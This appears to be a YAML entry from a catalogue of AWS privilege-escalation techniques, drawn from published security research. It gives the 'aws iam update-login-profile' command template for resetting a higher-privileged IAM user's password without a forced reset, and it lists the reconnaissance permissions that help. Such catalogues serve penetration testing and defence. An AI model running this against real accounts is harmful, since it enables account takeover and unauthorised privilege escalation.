---
description: |
    This command should be targeted against a user with higher privileges.

    The command changes the password of the targeted user. It is not possible to target the root user with this command.
details:
    AWS-CLI-command:
        - code: |
            aws iam update-login-profile --user-name {target user} --password {password} --no-password-reset-required
    required-privileges:
        - code: |
            None
    required-configurations:
        - code: |
            An existing higher privilege user.
    useful-privileges:
        - code: |
            iam:ListUsers
            iam:ListAttachedUserPolicies
            iam:GetPolicy
            iam:GetAccountPasswordPolicy
    sources:
        - code: |
            https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
---